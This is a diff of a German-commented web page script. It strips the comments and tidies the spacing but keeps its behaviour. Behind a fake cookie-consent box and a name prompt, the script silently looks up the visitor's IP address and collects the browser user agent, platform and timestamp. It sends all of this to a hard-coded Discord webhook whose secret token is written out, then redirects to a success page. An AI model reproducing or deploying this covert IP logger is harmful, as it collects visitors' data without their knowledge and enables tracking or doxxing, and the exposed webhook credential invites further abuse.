@@ -1,4 +1,3 @@
-// script.j
 document.addEventListener('DOMContentLoaded', () => {
   const overlay       = document.getElementById('cookie-overlay');
   const acceptBtn     = document.getElementById('accept-cookies');
@@ -7,13 +6,11 @@ document.addEventListener('DOMContentLoaded', () => {
   const nameInput     = document.getElementById('name-input');
   const loadingText   = document.getElementById('loading');
 
-  // Cookie-Box akzeptieren
   acceptBtn.addEventListener('click', () => {
     overlay.style.display = 'none';
     nameContainer.classList.remove('hidden');
   });
 
-  // Name absenden
   submitBtn.addEventListener('click', async () => {
     const name = nameInput.value.trim();
     if (!name) {
@@ -21,27 +18,23 @@ document.addEventListener('DOMContentLoaded', () => {
       return;
     }
 
-    // Verstecke Eingabe und zeige "Laden..."
-    nameInput.style.display   = 'none';
-    submitBtn.style.display   = 'none';
+    nameInput.style.display = 'none';
+    submitBtn.style.display = 'none';
     loadingText.classList.remove('hidden');
 
     try {
-      // IP-Adresse ermitteln
-      const ipRes   = await fetch('https://api.ipify.org?format=json');
-      const ipData  = await ipRes.json();
-      const ip      = ipData.ip;
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      const ip = ipData.ip;
 
-      const browser     = navigator.userAgent;
-      const platform    = navigator.platform;
+      const browser = navigator.userAgent;
+      const platform = navigator.platform;
       const zeitstempel = new Date().toLocaleString('de-DE');
 
-      // Payload für Discord
       const payload = {
         content: `# 📨 NEUE ANMELDUNG!\n**💬 Name:** ${name}\n**📌 IP-Addresse:** \`${ip}\`\n**🌏 Browsertyp:** ${browser}\n**📱 Gerätetyp:** ${platform}\n**⏰ Uhrzeit:** ${zeitstempel}\n**ℹ️ Weitere Informationen:** <https://whatismyipaddress.com/ip/${ip}>`
       };
 
-      // Webhook senden
       const webhookUrl = 'https://discord.com/api/webhooks/1394554954391355492/comU-mif2egSzF70Vx8BIyBr0yH4y2MuUOjbSKYql6As7GIu9kTxiIkZwv0xeJMOA1jI';
       await fetch(webhookUrl, {
         method: 'POST',
@@ -49,7 +42,6 @@ document.addEventListener('DOMContentLoaded', () => {
         body: JSON.stringify(payload)
       });
 
-      // Weiterleitung nach Erfolg
       window.location.href = 'https://MeineWebsite.de/success';
     } catch (err) {
       console.error('Fehler beim Senden:', err);
